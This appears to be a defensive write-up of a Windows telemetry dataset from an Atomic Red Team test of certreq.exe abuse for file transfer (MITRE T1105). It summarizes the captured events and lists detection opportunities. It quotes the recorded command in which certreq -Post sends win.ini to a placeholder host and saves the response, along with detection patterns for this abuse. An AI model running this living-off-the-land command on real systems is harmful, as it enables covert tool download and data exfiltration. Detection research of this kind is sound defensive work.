# T1105-25: Ingress Tool Transfer — certreq download

## Technique Context

T1105 Ingress Tool Transfer involves adversaries transferring tools or files from an external system to a compromised environment. The `certreq.exe` utility, a legitimate Windows certificate management tool, can be abused for this purpose by using its `-Post` parameter to send HTTP requests and download content from remote servers. This technique is particularly attractive to adversaries because certreq is a signed Microsoft binary (LOLBin) that may bypass application whitelisting and appears benign in process telemetry. The detection community focuses on monitoring unusual command-line parameters for certreq, particularly the `-Post` flag combined with external URLs, as well as network connections from this binary to non-certificate authority endpoints.

## What This Dataset Contains

This dataset captures a complete execution chain of certreq being used for file download. The Security channel shows the full process creation chain: PowerShell (PID 24692) spawns cmd.exe with command line `"cmd.exe" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt`, which then spawns certreq.exe (PID 24200) with the expanded command `certreq.exe -Post -config https://example.com c:\windows\win.ini C:\Windows\TEMP\Atomic-license.txt`. 

Sysmon captures the certreq process creation (EID 1) with rule classification `technique_id=T1027,technique_name=Obfuscated Files or Information`, DNS resolution for example.com (EID 22) returning IP addresses `104.18.27.120` and `104.18.26.120`, and file creation (EID 11) of a temporary file `C:\Windows\Temp\cerB56.tmp`. The PowerShell channel contains only test framework boilerplate (`Set-ExecutionPolicy Bypass`). Multiple Security 4689 events show cmd.exe processes exiting with status 0x1, indicating failures.

## What This Dataset Does Not Contain

The dataset shows multiple failed attempts (exit code 0x1 in Security events) but lacks the successful network connection telemetry that would be expected if the download completed. There are no Sysmon NetworkConnect events (EID 3) showing the actual HTTP connection to example.com, likely because the test uses a non-resolvable or unreachable endpoint. The temporary file `cerB56.tmp` is created but there's no evidence of successful content retrieval or the final output file being written to the specified location (`C:\Windows\TEMP\Atomic-license.txt`). Additionally, the sysmon-modular configuration's include-mode filtering means we're missing process creation events for the initial PowerShell processes that would have been launched by the test framework.

## Assessment

This dataset provides excellent telemetry for detecting certreq abuse attempts, even when the download fails. The Security 4688 events capture the complete command-line arguments showing the suspicious `-Post` parameter with an external URL, while Sysmon EID 1 events provide process hashes and parent-child relationships. The DNS query event (EID 22) is particularly valuable as it shows certreq attempting to resolve external domains, which is highly unusual for legitimate certificate operations. The file creation event demonstrates certreq's temporary file behavior during download attempts. The multiple failure events (exit code 0x1) actually strengthen the dataset by showing realistic failure scenarios that defenders encounter in production environments.

## Detection Opportunities Present in This Data

1. **Certreq with external URLs**: Security EID 4688 showing certreq.exe with `-Post` parameter and non-Microsoft/non-CA URLs in command line arguments
2. **Unusual certreq DNS activity**: Sysmon EID 22 showing certreq.exe resolving external domain names not associated with certificate authorities
3. **Certreq file creation patterns**: Sysmon EID 11 showing certreq creating temporary files in system directories during suspected download operations
4. **Process chain anomalies**: cmd.exe spawning certreq with network-related parameters, particularly when originating from scripting engines like PowerShell
5. **Certreq process access patterns**: Sysmon EID 10 showing PowerShell accessing certreq processes with high privileges (0x1FFFFF), indicating potential process injection or monitoring
6. **Failed download attempts**: Multiple Security EID 4689 events with exit code 0x1 for certreq processes, indicating blocked or failed transfer attempts that warrant investigation
